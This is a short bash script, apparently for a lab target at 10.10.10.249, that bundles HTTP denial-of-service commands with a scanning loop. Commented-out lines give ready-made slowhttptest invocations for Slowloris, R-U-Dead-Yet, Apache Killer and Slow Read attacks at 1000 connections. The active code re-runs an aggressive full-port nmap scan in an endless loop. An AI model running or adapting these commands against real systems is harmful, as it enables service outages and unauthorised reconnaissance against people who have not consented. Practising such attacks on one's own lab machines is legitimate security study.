#!/bin/bash

TARGET='http://10.10.10.249'

# Slowloris (Default) W/1000 Connections
# slowhttptest -H -c 1000 -g -o Logs/Slowloris.log -u "$TARGET" &

# R-U-Dead-Yet W/1000 Connections
# slowhttptest -B -c 1000 -g -o Logs/RUDeadYet.log -u "$TARGET" &

# Apache Killer W/1000 Connections
# slowhttptest -R -c 1000 -g -o Logs/ApacheKiller.log -u "$TARGET" &

# Slow Read W/1000 Connections
# slowhttptest -X -c 1000 -g -o Logs/SlowRead.log -u "$TARGET" &

# NetScan -> Nmap
# nmap -p- -A -T4 -sS -sC -sV -O 10.10.10.249 &

while true; do
    nmap -p- -A -T4 -sS -sC -sV -O 10.10.10.249 &
    PID=$!                                                     

    while kill -0 "$PID" >/dev/null 2>&1; do
        sleep 1
    done

    echo "Restarting..."
done